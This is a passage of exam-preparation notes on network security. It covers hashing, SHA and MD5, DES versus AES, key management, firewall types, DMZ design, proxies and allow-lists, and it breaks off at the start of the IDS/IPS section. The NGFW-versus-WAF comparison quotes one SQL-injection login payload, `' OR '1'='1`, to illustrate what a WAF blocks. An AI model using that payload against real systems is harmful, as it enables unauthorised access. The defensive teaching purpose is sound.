> The defining property: **hashing is IRREVERSIBLE.** There is no "unhash" operation. This is not a limitation — it is the entire point.

```mermaid
flowchart LR
    A["Input: 'Hello'<br/>(any size)"] --> H["HASH FUNCTION<br/>SHA-256"]
    H --> B["185f8db32271fe25f561a6fc938b2e26<br/>4306ec304eda518007d1764826381969<br/>(ALWAYS 256 bits)"]
    C["Input: a 5 GB video file"] --> H2["HASH FUNCTION<br/>SHA-256"]
    H2 --> D["a3f9c2…<br/>(still exactly 256 bits)"]
```

#### Properties of a good cryptographic hash function

| Property | Meaning |
|---|---|
| **Deterministic** | The same input **always** gives the same hash |
| **Fixed output size** | Regardless of input size |
| **Fast to compute** | Efficient in one direction |
| **One-way (pre-image resistant)** | Given the hash, it is **infeasible to find the input** |
| **Second pre-image resistant** | Given input x, it is infeasible to find y ≠ x with the same hash |
| **Collision resistant** | It is infeasible to find **any** two different inputs with the same hash |
| **Avalanche effect** | Changing **one bit** of the input changes **about half** the bits of the output |

#### The avalanche effect

> The **avalanche effect** is the property that a **tiny change in the input produces a drastically different, apparently unrelated output** — ideally, flipping one input bit flips about **50 %** of the output bits.

**Demonstration (SHA-256):**

| Input | SHA-256 (first 16 hex characters) |
|---|---|
| `Hello` | `185f8db32271fe25…` |
| `hello` *(only the case of one letter changed)* | `2cf24dba5fb0a30e…` |

The two outputs have **nothing in common**.

> ### "Is the avalanche effect desirable?"
> ### ✅ **YES — it is absolutely essential**, for four reasons:
> 1. **It prevents pattern analysis.** Without it, similar inputs would produce similar hashes, and an attacker could work out how close a guess was — turning a brute-force search into a guided hill-climb.
> 2. **It hides information about the input.** No part of the plaintext can be inferred from any part of the hash.
> 3. **It makes tampering obvious.** Changing a single character of a contract, a transaction or a software download produces a completely different hash, so the alteration cannot be hidden.
> 4. **It underpins collision resistance** and therefore the security of digital signatures, password storage and blockchain.
>
> *(The same property is required of good **block ciphers** — AES is designed so that changing one bit of plaintext or key changes about half the ciphertext bits.)*

#### The main hash algorithms

| Algorithm | Output size | Status |
|---|---|---|
| **MD5** | **128 bits** (32 hex characters) | ❌ **BROKEN** — collisions can be produced in seconds. Never use for security |
| **SHA-1** | **160 bits** | ❌ **BROKEN** (2017, the SHAttered attack). Deprecated |
| **SHA-224 / SHA-256** | 224 / **256 bits** | ✅ **Secure — the current standard** |
| **SHA-384 / SHA-512** | 384 / **512 bits** | ✅ **Secure** — stronger, and faster on 64-bit CPUs |
| **SHA-3 (Keccak)** | 224–512 bits | ✅ Secure — a different internal design, a backup to SHA-2 |
| **bcrypt / scrypt / Argon2 / PBKDF2** | Varies | ✅ **Deliberately SLOW** — designed specifically for **password storage** |

> ### "How many bits is MD5?"
> **MD5 produces a 128-bit (16-byte, 32 hexadecimal character) hash**, regardless of input size. It is **no longer considered secure** — practical collision attacks exist — so it survives only as a **non-security checksum** for detecting accidental file corruption.

#### SHA-256 vs SHA-512

| Point | **SHA-256** | **SHA-512** |
|---|---|---|
| **Output length** | **256 bits** (64 hex chars) | **512 bits** (128 hex chars) |
| **Block size processed** | 512 bits | **1024 bits** |
| **Word size** | **32-bit** words | **64-bit** words |
| **Rounds** | 64 | **80** |
| **Security level (collision)** | 2¹²⁸ | **2²⁵⁶** |
| **Speed on a 64-bit CPU** | Slower | **FASTER** — it uses native 64-bit operations |
| **Speed on a 32-bit CPU** | **Faster** | Slower |
| **Output size** | Compact | Twice as large to store and transmit |
| **Used in** | **Bitcoin, TLS certificates, most general use** | High-security applications, SHA-512/256 truncation |

Both belong to the **SHA-2 family** designed by the NSA and published by **NIST** in 2001, and both remain **unbroken**.

#### Hashing vs Encryption — the key comparison

| Point | **Hashing** | **Encryption** |
|---|---|---|
| **Reversible?** | ❌ **NO — one-way** | ✅ **YES — two-way** |
| **Purpose** | **INTEGRITY** — verify that data has not changed | **CONFIDENTIALITY** — keep data secret |
| **Key required?** | ❌ **No key** (a MAC/HMAC adds one) | ✅ **Yes — always** |
| **Output size** | **FIXED**, regardless of input size | **Varies** with the input size |
| **Can the original be recovered?** | ❌ Never | ✅ Yes, with the key |
| **Main question it answers** | *"Has this changed?"* / *"Does this match?"* | *"Can anyone else read this?"* |
| **Typical use** | **Password storage**, file-integrity checksums, digital signatures, blockchain, data structures | Securing messages, files, disks, network traffic |
| **Algorithms** | **MD5, SHA-1, SHA-256, SHA-512, bcrypt** | **AES, DES, RSA, ECC, Blowfish** |
| **If two inputs give the same output** | A **collision** — a serious flaw | Not applicable |
| **Example** | `password123` → `ef92b778bafe771e…` (cannot be reversed) | `Hello` → `KHOOR` → decrypts back to `Hello` |

> **The classic illustration — password storage.** A website must **never** store your password, encrypted or otherwise, because anyone with the decryption key could recover every password. Instead it stores the **hash**. When you log in, it hashes what you typed and **compares the two hashes**. Even a full database breach does not reveal the passwords — provided the hashes are **salted** and a **slow** algorithm such as **bcrypt** is used.
>
> **Salting** means adding a unique random value to each password before hashing, so that two users with the same password get different hashes, and **precomputed rainbow tables become useless**.

#### Encryption vs Hashing vs Digital Signature — the three-way comparison

| Point | **Encryption** | **Hashing** | **Digital Signature** |
|---|---|---|---|
| **Primary goal** | **Confidentiality** | **Integrity** | **Authentication + Integrity + Non-repudiation** |
| **Reversible** | ✅ Yes | ❌ No | Signature verification, not reversal |
| **Key used** | Shared key, or the **receiver's public key** | **None** | The **sender's PRIVATE key** to sign; **public key** to verify |
| **Output** | Ciphertext (variable size) | Fixed-size digest | A signature block attached to the message |
| **Provides confidentiality?** | ✅ Yes | ❌ No | ❌ **No** — the message stays readable |
| **Provides non-repudiation?** | ❌ No | ❌ No | ✅ **YES — its unique property** |
| **Banking use** | Encrypting card data, PINs, the TLS channel, the database at rest | Storing passwords, verifying file and message integrity, generating transaction fingerprints | **Authorising high-value transfers**, e-tender submissions, signed audit logs, SSL certificates, cheque truncation images |

**How they combine in one secure banking transaction:**
1. The instruction is **hashed** → a digest.
2. The digest is **signed** with the customer's **private key** → proves who authorised it and that it was not altered.
3. The whole package is **encrypted** with the bank's **public key** (or with an AES session key exchanged under TLS) → keeps it confidential in transit.
4. The bank decrypts, re-hashes, verifies the signature with the customer's **public key**, and executes.

**Previous Year Question List from this Topic:**

- [Explain the operational difference between Hashing and Encryption. (SO IT 25-07-2026)](../written-answers/computer-network-security.md?plain=1#L990)
- [What is social engineering? What is hashing? How is it different from encryption?](../written-answers/computer-network-security.md?plain=1#L1042)
- [Write the differences among encryption, hashing, and digital signatures. Mention their uses in cybersecurity.](../written-answers/computer-network-security.md?plain=1#L1101)
- [How many bits MD5 encryption?](../written-answers/computer-network-security.md?plain=1#L1132)
- [6.2 Explain the operational difference between Hashing and Encryption.](../written-answers/computer-network-security.md?plain=1#L1171)
- [What is SHA-256 and SHA-512 in network security, what is avalanche effect, is it desirable or undesirable.](../written-answers/computer-network-security.md?plain=1#L1537)


---

### Identifying Algorithm Types, DES and Key Management

#### Classifying the common algorithms

> *(A very common short question: "Identify the type of each algorithm — MD5, AES, RSA, Diffie-Hellman.")*

| Algorithm | **Type** | Purpose | Key/Output size |
|---|---|---|---|
| **MD5** | **Hash function** (one-way) | Message digest / checksum | **128-bit output**, no key |
| **SHA-256 / SHA-512** | **Hash function** | Message digest | 256 / 512-bit output |
| **AES** | **Symmetric block cipher** | Bulk encryption | 128 / 192 / 256-bit key |
| **DES / 3DES** | **Symmetric block cipher** | Bulk encryption (legacy) | 56-bit / 168-bit key |
| **Blowfish, RC4, IDEA, ChaCha20** | **Symmetric cipher** | Bulk encryption | Varies |
| **RSA** | **Asymmetric** (public-key) | Encryption **and** digital signature | 2048 / 4096-bit key |
| **Diffie-Hellman** | **Asymmetric — KEY EXCHANGE only** | Agreeing a shared secret over an insecure channel. **It cannot encrypt a message** | 2048+ bits |
| **ECC / ECDSA / ECDH** | **Asymmetric** | Encryption, signature, key exchange | 256-bit |
| **DSA** | **Asymmetric — SIGNATURE only** | Digital signatures | 2048+ bits |
| **HMAC** | **Keyed hash (MAC)** | Integrity **and** authentication | Uses a hash + a secret key |
| **bcrypt / Argon2 / PBKDF2** | **Password-hashing function** | Slow, salted password storage | — |

> **The key distinction the examiner is testing:** **MD5 is a HASH (one-way, no key)**; **AES is SYMMETRIC (one shared key)**; **RSA is ASYMMETRIC (key pair, can encrypt and sign)**; **Diffie-Hellman is ASYMMETRIC but is a KEY-EXCHANGE protocol only — it neither encrypts data nor signs it.**

#### SHA vs RSA — a frequently confused pair

| Point | **SHA** | **RSA** |
|---|---|---|
| **What it is** | A **HASH function** | An **asymmetric ENCRYPTION / signature algorithm** |
| **Keys** | **None** | A **public/private key pair** |
| **Reversible** | ❌ **Never** | ✅ Yes, with the private key |
| **Output** | A **fixed-size digest** (160/256/512 bits) | Ciphertext or a signature, the size of the modulus |
| **Provides** | **Integrity** | **Confidentiality, authentication, non-repudiation** |
| **Speed** | **Very fast** | **Slow** |
| **Purpose** | Fingerprinting data | Encrypting keys, signing documents |
| **Used together?** | ✅ **Yes** — in a digital signature, **SHA hashes the document and RSA signs the hash**. Signing the whole document with RSA would be far too slow | |

#### DES — the Data Encryption Standard

**DES** is a **symmetric block cipher** adopted as a US federal standard in 1977, based on IBM's Lucifer cipher.

**The high-level method:**

```mermaid
flowchart TD
    A["64-bit PLAINTEXT block"] --> B["Initial Permutation (IP)"]
    B --> C["Split into LEFT (32 bits) and RIGHT (32 bits)"]
    C --> D["16 ROUNDS of the Feistel function<br/>Lᵢ = Rᵢ₋₁<br/>Rᵢ = Lᵢ₋₁ ⊕ F(Rᵢ₋₁, Kᵢ)"]
    D --> E["32-bit swap"]
    E --> F["Inverse Initial Permutation (IP⁻¹)"]
    F --> G["64-bit CIPHERTEXT block"]
    K["56-bit KEY<br/>(64 bits with 8 parity bits)"] --> KS["Key schedule —<br/>generates 16 subkeys K₁…K₁₆<br/>of 48 bits each"]
    KS --> D
```

| Property | Value |
|---|---|
| **Block size** | **64 bits** |
| **Key size** | **56 bits** effective (64 bits including 8 parity bits) |
| **Number of rounds** | **16** |
| **Structure** | **Feistel network** — the same algorithm encrypts and decrypts, only the subkey order reverses |
| **Each round uses** | Expansion (32 → 48 bits), XOR with the subkey, **8 S-boxes** (48 → 32 bits, the only non-linear part), and a permutation |

**Why DES is obsolete:** the **56-bit key gives only 2⁵⁶ ≈ 7.2 × 10¹⁶ possibilities**, which was brute-forced in **22 hours** by the EFF's "Deep Crack" machine in 1999 and takes minutes today. **3DES** (encrypt–decrypt–encrypt with three keys, giving 112-bit effective strength) extended its life, but **AES** replaced both in **2001**.

| Point | **DES** | **AES** |
|---|---|---|
| Block size | 64 bits | **128 bits** |
| Key size | **56 bits** | **128 / 192 / 256 bits** |
| Rounds | 16 | 10 / 12 / 14 |
| Structure | **Feistel network** | **Substitution-Permutation network** |
| Security | ❌ **Broken** | ✅ **Secure** |
| Speed | Slower | **Faster** |
| Year | 1977 | **2001** |

#### Key management and PKI

**The hardest problem in cryptography is not the algorithms — it is managing the keys.**

| Element | Purpose |
|---|---|
| **Key generation** | Using a **cryptographically secure random number generator** — weak randomness has broken many real systems |
| **Key distribution** | Getting keys to the right parties securely (solved for public keys by **certificates**, and for symmetric keys by **key exchange**) |
| **Key storage** | In an **HSM (Hardware Security Module)**, a smart card, or a protected key vault — **never in source code** |
| **Key rotation** | Changing keys periodically limits the damage of a compromise |
| **Key revocation** | **CRL** and **OCSP** publish certificates that are no longer trustworthy |
| **Key destruction** | Secure deletion at end of life |

**PKI (Public Key Infrastructure)** is the complete framework of **hardware, software, policies and procedures** that creates, manages, distributes and revokes **digital certificates**, binding a public key to a verified identity. Its components are the **Certificate Authority (CA)**, the **Registration Authority (RA)**, the **certificate repository**, the **CRL**, and the end entities. *(See the Authentication section for how certificates and signatures work in detail.)*

**Previous Year Question List from this Topic:**

- [The high level method of DES...](../written-answers/computer-network-security.md?plain=1#L1383)
- [Identify the type of algorithm? (i) MD5 (ii) AES (iii) RSA (iv) Diffie-Hellman](../written-answers/computer-network-security.md?plain=1#L1435)
- [Write two symmetric key algorithm name.](../written-answers/computer-network-security.md?plain=1#L1633)
- [What is difference between SHA and RSA algorithm?](../written-answers/computer-network-security.md?plain=1#L4195)

## Firewalls & Network Defense

### Firewall — Concept, Types and Placement

#### What is a firewall?

A **firewall** is a **network security device or software that monitors and controls incoming and outgoing network traffic based on a predetermined set of security rules**, forming a **barrier between a trusted internal network and an untrusted external network** such as the Internet.

> **The analogy:** a firewall is the **security guard at the gate of a building**. Everyone entering or leaving is checked against a list. Those on the list pass; everyone else is turned away — and the guard writes down who came and went.

#### Why a firewall is important

1. **Blocks unauthorised access** from the Internet into the internal network.
2. **Filters malicious traffic** — malware, exploits, port scans, known bad IPs.
3. **Enforces security policy** — which services, ports and applications are permitted.
4. **Prevents data exfiltration** by controlling **outbound** traffic too.
5. **Network segmentation** — isolates departments, servers and the DMZ so a breach cannot spread.
6. **Logging and monitoring** — a complete record for auditing and forensics.
7. **Stops DoS/DDoS traffic** and rate-limits abuse.
8. **Hides the internal network** through **NAT** — internal addresses are never exposed.
9. **Controls user access** — blocks unproductive or dangerous websites.
10. **Regulatory compliance** — a firewall is mandatory under PCI-DSS and the Bangladesh Bank ICT guideline.
11. **VPN termination** for secure remote access.

#### How a firewall works

```mermaid
flowchart LR
    I["🌐 INTERNET<br/>untrusted"] --> F{"FIREWALL<br/>checks each packet<br/>against the rule base"}
    F -->|"ALLOW — matches a permit rule"| L["🏢 INTERNAL LAN<br/>trusted"]
    F -->|"DENY — no matching rule<br/>(implicit deny-all)"| X["❌ Dropped and logged"]
    L --> F
```

Every packet is checked against an ordered **rule base (ACL)** using **source IP, destination IP, source port, destination port and protocol**. The first matching rule wins, and the final rule is always an **implicit "deny all"** — anything not explicitly permitted is blocked.

| Rule # | Source | Destination | Port | Protocol | Action |
|---|---|---|---|---|---|
| 1 | Any | Web server (DMZ) | 443 | TCP | **ALLOW** |
| 2 | Any | Web server (DMZ) | 80 | TCP | **ALLOW** |
| 3 | Internal LAN | Any | 53 | UDP | **ALLOW** (DNS) |
| 4 | Any | Internal LAN | Any | Any | **DENY** |
| 5 | Any | Any | Any | Any | **DENY (implicit)** |

#### Types of firewall

```mermaid
flowchart TD
    F["FIREWALL TYPES"]
    F --> A["1 . Packet-Filtering<br/>(Layer 3/4) — 1st generation"]
    F --> B["2 . Stateful Inspection<br/>(Layer 3/4 + state) — 2nd generation"]
    F --> C["3 . Application / Proxy<br/>(Layer 7) — 3rd generation"]
    F --> D["4 . Next-Generation Firewall (NGFW)"]
    F --> E["5 . Web Application Firewall (WAF)"]
    F --> G["6 . Circuit-Level Gateway"]
```

#### 1. Packet-filtering firewall

> ### "What is a packet filter?"
> A **packet-filtering firewall** is the **simplest and oldest type**. It examines **each packet in ISOLATION** and permits or drops it based only on the information in the packet's **header** — **source IP, destination IP, source port, destination port and protocol (TCP/UDP/ICMP)** — matched against a static **Access Control List**.
>
> It is **STATELESS**: it keeps **no memory** of previous packets and no concept of a "connection". Each packet is judged entirely on its own.

**Advantages:** **very fast** and low overhead · **cheap** · transparent to users · protects the whole network at one point · built into every router.

**Disadvantages:** **cannot inspect the packet's payload/content**, so it cannot detect malware or an attack hidden inside an allowed protocol · **cannot track connection state**, so it is fooled by **spoofed packets and fragmented attacks** · vulnerable to **IP spoofing** · rule bases become large and hard to manage · **no user authentication** · no logging of application-level activity.

#### 2. Stateful inspection firewall

Maintains a **state table** of every active connection and evaluates each packet **in the context of that connection**.

| Point | **Stateless (Packet Filter)** | **Stateful Inspection** |
|---|---|---|
| **Examines** | Each packet **individually** | Each packet **in the context of its connection** |
| **Tracks connection state?** | ❌ **No** | ✅ **Yes** — a state table of source/destination, ports, sequence numbers and TCP flags |
| **Return traffic** | Must be **explicitly permitted** by a separate rule — which weakens security | **Automatically allowed** if it belongs to an established outbound connection |
| **Layers** | 3 and 4 | 3 and 4, with connection awareness |
| **Security** | **Lower** | **Higher** |
| **Speed** | **Faster** | Slightly slower |
| **Memory use** | Minimal | Higher — the state table must be held |
| **Detects spoofed/out-of-sequence packets** | ❌ No | ✅ **Yes** |
| **Protects against SYN flood** | ❌ Poorly | ✅ Better (can enforce connection limits) |
| **Rule complexity** | High — separate rules for each direction | **Lower** — one rule covers the whole session |
| **Used in** | Simple routers, basic ACLs | **Virtually all modern firewalls** |

> **The practical difference:** with a **stateless** firewall, allowing your staff to browse the web requires a rule permitting inbound traffic on **all high ports** — a large hole. With a **stateful** firewall, one outbound rule is enough: the return packets are recognised as part of a connection the internal user started, and everything else is dropped.

#### 3. Application-level gateway (proxy firewall)

Operates at **Layer 7** and acts as an **intermediary**: the client connects to the proxy, and the proxy makes a **separate connection** to the server. There is **never a direct connection** between inside and outside.

**Advantages:** deep **content inspection** · strong logging and user authentication · hides the internal network completely · can filter by URL, command and content.
**Disadvantages:** **slow** — it terminates and rebuilds every connection · a separate proxy is needed per protocol · can be a bottleneck and a single point of failure.

#### 4. Next-Generation Firewall (NGFW)

An NGFW combines traditional stateful filtering with **deep packet inspection and application awareness**.

| Capability | Traditional firewall | **NGFW** |
|---|---|---|
| **Layers inspected** | 3 and 4 only | **3 to 7 — including the application layer** |
| **Decision based on** | IP address and **port number** | **The actual APPLICATION**, regardless of port |
| **Deep Packet Inspection (DPI)** | ❌ No | ✅ **Yes** — inspects the payload |
| **Built-in IPS** | ❌ No | ✅ **Yes** |
| **User identity awareness** | ❌ No — IP only | ✅ **Yes** — integrates with AD/LDAP to apply rules per *user* |
| **SSL/TLS inspection** | ❌ No | ✅ **Yes** — decrypts, inspects, re-encrypts |
| **Malware / sandboxing** | ❌ No | ✅ Yes |
| **Threat intelligence feeds** | ❌ No | ✅ Yes — automatic updates of known bad indicators |
| **Example** | Basic Cisco ACL, iptables | **Palo Alto, Fortinet FortiGate, Cisco Firepower, Check Point** |

> **Why port-based filtering is no longer enough:** almost everything now runs over **port 443 (HTTPS)** — Facebook, Dropbox, BitTorrent clients, Skype, malware command-and-control. A traditional firewall sees only "port 443, allow". An **NGFW identifies the application itself** and can permit Office 365 while blocking Dropbox, both on the same port.

#### 5. NGFW vs WAF — a frequently asked comparison

| Point | **NGFW (Next-Generation Firewall)** | **WAF (Web Application Firewall)** |
|---|---|---|
| **Protects** | **The whole NETWORK** and all its traffic | **ONE specific web application / web server** |
| **Layers** | **3 – 7** (broad) | **Layer 7 only** (deep) |
| **Position** | At the **network perimeter** | **In front of the web server** (reverse proxy or on the server) |
| **Traffic scope** | **All** protocols — HTTP, FTP, SMTP, DNS, SSH, database, VoIP | **HTTP/HTTPS only** |
| **Attacks blocked** | Network intrusions, malware, port scans, unauthorised applications, DDoS, C2 traffic | **SQL injection, XSS, CSRF, file inclusion, session hijacking, OWASP Top 10, credential stuffing, bot traffic** |
| **Understands** | Applications and users | **HTTP requests, parameters, cookies, headers and the application's logic** |
| **Typical deployment** | Hardware appliance at the edge | Reverse proxy, cloud service (Cloudflare, AWS WAF) or a server module (ModSecurity) |
| **Analogy** | The **security guard at the building's main gate** | The **specialist guard at the bank vault door**, who understands exactly what a legitimate vault transaction looks like |

> **They are complementary, not alternatives.** An NGFW cannot tell that `' OR '1'='1` inside a login form field is a SQL-injection payload — to the NGFW it is just valid HTTPS traffic to an allowed server on an allowed port. A **WAF understands the application's parameters and blocks it**. A secure design uses an **NGFW at the perimeter and a WAF in front of every public web application**.

#### Firewall vs Antivirus

| Point | **Firewall** | **Antivirus** |
|---|---|---|
| **Works at** | The **network** level | The **file / host** level |
| **Protects against** | Unauthorised **network access and traffic** | **Malicious software** already present or arriving |
| **Scope** | The whole network (or one host) | Usually **one computer** |
| **Method** | Filters **packets** against rules | Scans **files** against signatures and behaviour |
| **When it acts** | While data is **in transit** | While a file is **stored or executed** |
| **Stops a virus on a USB stick?** | ❌ **No** — no network involved | ✅ **Yes** |
| **Stops an intruder scanning your ports?** | ✅ **Yes** | ❌ No |
| **Type** | Hardware or software | Software only |
| **Examples** | pfSense, FortiGate, Windows Defender Firewall | Kaspersky, Norton, Bitdefender, Windows Defender Antivirus |

> **Both are essential.** A firewall is the fence around the house; an antivirus is the inspection of everything brought inside. Neither replaces the other.

**Previous Year Question List from this Topic:**

- [What is Packet Filter of Firewall?](../written-answers/computer-network-security.md?plain=1#L1899)
- [Write down the difference between Next-Generation Firewall (NGFW) and Web Application Firewall (WAF)?](../written-answers/computer-network-security.md?plain=1#L1934)
- [Different types of network firewalls. Explain NGFW compared to traditional firewall.](../written-answers/computer-network-security.md?plain=1#L2035)
- [What is Firewall? Discuss about different types of Firewall.](../written-answers/computer-network-security.md?plain=1#L2069)
- [Draw a diagram of LAN including network Firewall. Why is firewall important in network security? List 5 major types of network firewalls. Differentiate between…](../written-answers/computer-network-security.md?plain=1#L2104)
- [What is firewall and why it is used?](../written-answers/computer-network-security.md?plain=1#L2149)
- [What is the function of a firewall?](../written-answers/computer-network-security.md?plain=1#L2166)
- [Write difference between Antivirus and Firewall.](../written-answers/computer-network-security.md?plain=1#L2316)
- [What is firewell? Draw a LAN network to showing firewall.](../written-answers/computer-network-security.md?plain=1#L2337)
- [What is firewall? explain its work. Draw a LAN network and a firewall where firewall will be situated.](../written-answers/computer-network-security.md?plain=1#L2400)
- [What is Stateful and Stateless Firewall?](../written-answers/computer-network-security.md?plain=1#L2437)
- [Write the difference between WPA firewall and Network Firewall.](../written-answers/computer-network-security.md?plain=1#L4313)


---

### DMZ, Proxy Server and Network Segmentation

#### What is a DMZ?

A **DMZ (Demilitarised Zone)**, also called a **perimeter network** or **screened subnet**, is a **separate network segment placed between the untrusted Internet and the trusted internal LAN**, which hosts the organisation's **public-facing servers**.

> **The purpose:** public servers must be reachable from the Internet, but if one of them is hacked, the attacker must **NOT** gain direct access to the internal network. The DMZ is the buffer that guarantees this.

#### The standard DMZ architecture — dual firewall (screened subnet)

```mermaid
flowchart TD
    INT["🌐 INTERNET<br/>(untrusted)"] --> FW1["FIREWALL 1 — External<br/>allows only ports 80, 443, 25, 53<br/>into the DMZ"]
    FW1 --> DMZ
    subgraph DMZ["🟡 DMZ — semi-trusted"]
        WEB["Web Server"]
        MAIL["Mail Server"]
        DNS["DNS Server"]
        FTP["FTP / Proxy / Reverse Proxy"]
    end
    DMZ --> FW2["FIREWALL 2 — Internal<br/>allows ONLY specific application traffic<br/>from the DMZ to specific internal hosts"]
    FW2 --> LAN
    subgraph LAN["🟢 INTERNAL LAN — trusted"]
        DB[("Database Server")]
        FS["File Server"]
        AD["Active Directory"]
        PC["Employee workstations"]
    end
```

**The rule that makes a DMZ work:**

| Traffic direction | Policy |
|---|---|
| Internet → **DMZ** | ✅ **Allowed**, but only on the specific required ports (80, 443, 25, 53) |
| Internet → **Internal LAN** | ❌ **BLOCKED completely** |
| **DMZ → Internal LAN** | ⚠️ **Severely restricted** — only the exact application port needed (e.g. the web server to the database on port 3306), from the exact host |
| Internal LAN → DMZ | ✅ Allowed (for administration) |
| Internal LAN → Internet | ✅ Allowed (usually via a proxy) |

**Why the DMZ → LAN restriction is the critical rule:** it means that **even if the public web server is completely compromised**, the attacker is trapped in the DMZ and cannot reach the database, file server or workstations except through one tightly controlled path.

#### Single-firewall (three-legged) DMZ

A cheaper design uses **one firewall with three interfaces** — Internet, DMZ and LAN — with different rules on each. It is **less secure** (one device is a single point of failure and a single configuration mistake exposes everything) but common in smaller organisations.

#### What belongs in a DMZ

| In the DMZ ✅ | In the internal LAN ✅ |
|---|---|
| Web server / reverse proxy | **Database server** |
| Mail gateway (SMTP relay) | File server, Active Directory |
| External DNS server | Internal DNS, DHCP |
| FTP / SFTP server | Application servers holding sensitive data |
| VPN concentrator | Workstations, printers |
| WAF / load balancer | Backup servers, HR and finance systems |

> **The single most important design rule: the DATABASE SERVER NEVER goes in the DMZ.** It stays in the internal network, reachable only from the specific web/application server on the specific database port.

#### A worked design — a bank's network

> *"Bangladesh Bank has a client-server network communicating with a Mail Server, DNS server and Web server. Design the placement."*

```mermaid
flowchart TD
    NET["🌐 Internet"] --> RTR["Border Router<br/>+ anti-DDoS"]
    RTR --> FWE["External Firewall (NGFW)"]
    FWE --> DMZ2
    subgraph DMZ2["DMZ"]
        WAF["WAF"] --> WS["Web Server<br/>(internet banking front end)"]
        MS["Mail Gateway<br/>(anti-spam, anti-virus)"]
        DS["External DNS"]
        VPN["VPN Gateway"]
    end
    DMZ2 --> FWI["Internal Firewall"]
    FWI --> CORE
    subgraph CORE["Internal Network"]
        APP["Application Servers"] --> DB[("Core Banking Database")]
        AD2["Active Directory / LDAP"]
        MAILI["Internal Mail Store"]
        BR["Branch users / ATMs<br/>(separate VLANs)"]
    end
    CORE --> DR["Disaster Recovery Site<br/>(replication over an encrypted link)"]
```

**Key points to state:** public servers in the **DMZ**; the **core banking database in the innermost zone**, never internet-facing; **two firewalls from different vendors** if possible (defence in depth); **VLAN segmentation** of branches, ATMs and departments; **IDS/IPS** monitoring both segments; **all traffic encrypted** (TLS internally too); **MFA** for all administrative access; and a **SIEM** collecting logs from every device.

#### What is a proxy server?

A **proxy server** is an **intermediary between a client and a destination server**. The client's request goes to the proxy, and the proxy makes the request on the client's behalf and returns the result.

```mermaid
flowchart LR
    C["Client<br/>192.168.1.50"] --> P["PROXY SERVER"]
    P --> S["🌐 Web Server<br/>sees only the PROXY'S IP"]
    S --> P
    P --> C
```

| Type | Direction | Purpose |
|---|---|---|
| **Forward proxy** | Sits in front of the **clients** | Content filtering, caching, anonymity, access control for internal users going out |
| **Reverse proxy** | Sits in front of the **servers** | Load balancing, SSL termination, caching, hiding and protecting the real servers (**Nginx, HAProxy, Cloudflare**) |
| **Transparent proxy** | Intercepts without client configuration | ISP caching, corporate filtering |
| **Anonymous proxy / VPN** | Hides the client's identity | Privacy |

**Functions and benefits:** **content filtering** (block social media or malicious sites) · **caching** — frequently requested pages are served locally, saving bandwidth and time · **anonymity** — the destination sees only the proxy's IP · **access control and user authentication** · **detailed logging and monitoring** · **bandwidth control** · **security** — malware scanning and hiding the internal topology · **load balancing** (reverse proxy) · **bypassing geo-restrictions**.

**Limitations:** a **single point of failure** and potential bottleneck; it can **read all unencrypted traffic** (a privacy concern); cached content may become stale; and HTTPS inspection requires installing the proxy's certificate on every client.

#### Blacklisting vs Whitelisting

| Point | **Blacklisting** (deny-list) | **Whitelisting** (allow-list) |
|---|---|---|
| **Principle** | **"Deny what is known to be BAD; allow everything else"** | **"Allow ONLY what is known to be GOOD; deny everything else"** |
| **Default action** | **ALLOW** | **DENY** |
| **List contains** | Known malicious IPs, domains, applications, file hashes | Explicitly approved IPs, domains, applications |
| **Maintenance** | The list must be **constantly updated** as new threats appear | The list changes only when a legitimate new item is approved |
| **Flexibility for users** | **High** — anything not banned works | **Low** — anything not pre-approved is blocked |
| **Protects against zero-day / unknown threats?** | ❌ **NO** — an unknown threat is not on the list, so it is allowed | ✅ **YES** — an unknown item is not on the allow-list, so it is blocked |
| **False positives** | Few | **Many** — legitimate new software is blocked until approved |
| **Administrative effort** | Moderate but never-ending | **High** initially, lower afterwards |
| **User experience** | Convenient | Restrictive; users complain |
| **Best for** | General-purpose environments, public web filtering, spam and antivirus signatures | **High-security environments** — ATMs, POS terminals, SCADA/industrial control, card-data systems, servers with a fixed software set |
| **Examples** | Antivirus signature databases, spam blocklists, blocked-website lists | Application whitelisting (AppLocker), firewall allow-only rules, API key allow-lists |

> ### Which is more secure, and why?
> ### ✅ **WHITELISTING is significantly more secure.**
>
> **The reason is the default action.** Blacklisting operates on **"default allow"** — it can only stop threats that someone has already **identified, analysed and added to the list**. A brand-new virus, a **zero-day exploit**, or a custom piece of malware written specifically for your organisation is, by definition, **not on any blacklist**, so it passes straight through. Blacklisting is therefore always **reactive — permanently one step behind the attacker**.
>
> Whitelisting operates on **"default deny"**. Anything that is not explicitly approved is blocked **whether or not anyone has ever seen it before**. It is **proactive** and it closes the entire category of unknown threats at once.
>
> **The trade-off is usability and administration.** Whitelisting is impractical for a general office where users install varied software, and every new application requires an approval process. That is why the practical answer is: **use whitelisting wherever the set of legitimate items is small and stable** — servers, ATMs, POS terminals, industrial controllers, firewall rules for a DMZ — and **use blacklisting where flexibility is essential**, layered with other controls. Most mature security architectures use **both**: a whitelist for what may run, plus a blacklist of known-bad indicators as an extra net.

**Previous Year Question List from this Topic:**

- [Bangladesh Bank have client server and the communication with Mail Server, DNS server, Web server. Bangladesh Bank want to ensure the security using firewall on…](../written-answers/computer-network-security.md?plain=1#L1968)
- [What is Demilitarized Zone (DMZ) and sandbox for security test?](../written-answers/computer-network-security.md?plain=1#L2009)
- [DMZ and firewall placement in a diagram. (Approximate)](../written-answers/computer-network-security.md?plain=1#L2183)
- [What is Blacklist and Whitelist? Write down the difference between Black list and White list.](../written-answers/computer-network-security.md?plain=1#L2218)
- [What is DMZ in data center? Describe using diagram? Write the network devices in this system?](../written-answers/computer-network-security.md?plain=1#L2239)
- [Difference between blacklisting and whitelisting. Which is more secure and why?](../written-answers/computer-network-security.md?plain=1#L2290)
- [What is proxy server? Explain it.](../written-answers/computer-network-security.md?plain=1#L2368)
- [What is DMZ? Explain with appropriate figure.](../written-answers/computer-network-security.md?plain=1#L2469)


---

### IDS, IPS and Defence in Depth

#### IDS vs IPS

| Point | **IDS (Intrusion Detection System)** | **IPS (Intrusion Prevention System)** |
|---|---|---|
| **Action on detection** | **DETECTS and ALERTS** only | **DETECTS and BLOCKS** automatically |
| **Placement** | **Out-of-band** — receives a copy of the traffic (SPAN/TAP port) | **In-line** — all traffic passes **through** it |
| **Impact on traffic** | **None** — it cannot delay or drop anything | Adds latency; a failure can break the network |
| **Response** | Passive — a human must act | **Active** — the packet is dropped or the session reset |
| **Risk of false positives** | An annoyance (a needless alert) | **Serious** — legitimate traffic gets blocked |
| **Also called** | A network burglar **alarm** | A network **security guard** |

#### Detection methods

